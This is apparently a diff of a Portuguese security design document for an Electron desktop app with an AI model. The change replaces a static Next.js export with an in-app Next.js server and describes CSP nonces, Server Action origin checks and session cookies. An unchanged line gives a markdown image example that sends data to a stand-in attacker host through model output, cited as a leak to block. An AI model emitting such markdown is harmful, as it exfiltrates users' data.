@@ -560,7 +560,12 @@ Seguir a lista oficial de segurança do Electron ([Electron Security](https://el
 - Validar a origem de toda mensagem IPC.
 - Markdown vindo do modelo é renderizado com sanitização e **sem carregar imagens remotas** sozinho. Esse é um canal clássico de vazamento: `![x](https://atacante/?dados=…)`.
 - Protocolo próprio (`app://`) em vez de `file://`.
-- **Interface em Next.js ([decisão 0013](decisoes/0013-interface-em-nextjs-dentro-do-electron.md)):** exportação estática, sem servidor do Next rodando no PC (nada de rota de API, *server action* ou porta local aberta). O App Router gera scripts inline; em vez de liberar `unsafe-inline`, o build grava em cada página a CSP com o SHA-256 de cada script (`script-src 'self' 'sha256-…'`), e o Zod roda sem JIT para não tentar `new Function`. O teste da exportação no Chromium não acusou nenhuma violação. A telemetria do Next fica desligada e o servidor de desenvolvimento só escuta em `127.0.0.1`.
+- **Interface em Next.js com servidor ([decisão 0016](decisoes/0016-nextjs-com-servidor-dentro-do-electron.md), que substitui a exportação estática da 0013):** páginas, Server Actions e rotas são o back-end da interface, mas **o app instalado não abre porta**: o Electron entrega ao servidor do Next, dentro do próprio app, só os pedidos da janela do Jesus para `https://jesus.invalid/` e recusa qualquer outro endereço. Outros programas e sites não alcançam esse back-end.
+  - **CSP com nonce novo a cada pedido** (`src/proxy.ts`): `script-src 'self' 'nonce-…' 'strict-dynamic'` e estilos com o mesmo nonce, sem `unsafe-inline`; `unsafe-eval` só no desenvolvimento. Mais `X-Frame-Options: DENY`, `nosniff`, `no-referrer` e `Permissions-Policy`. O Zod roda sem JIT para não tentar `new Function`. O teste no Chromium não acusou nenhuma violação.
+  - **Server Actions são pontos de entrada:** só aceitam POST com a mesma origem (o Next confere `Origin` contra `Host`; o teste com origem falsa foi recusado e não contou tentativa), e cada uma valida a entrada com Zod e confere a sessão sozinha. Cada página protegida também confere (o layout não roda de novo a cada navegação).
+  - **Sessão:** cookie `HttpOnly`, `SameSite=Strict` (e `Secure` no app em https), com 256 bits aleatórios; o servidor guarda só o SHA-256. Bloquear apaga a sessão.
+  - O back-end do Next é a camada da interface: não executa ferramentas nem guarda tokens de contas (Cérebro, Porteiro e Executor seguem em processos próprios, seção 2.2).
+  - A telemetria do Next fica desligada e o servidor de desenvolvimento só escuta em `127.0.0.1`.
 - Cartões de confirmação num componente separado, que o conteúdo do modelo não consegue imitar.
 
 ## 3.13 Autoproteção
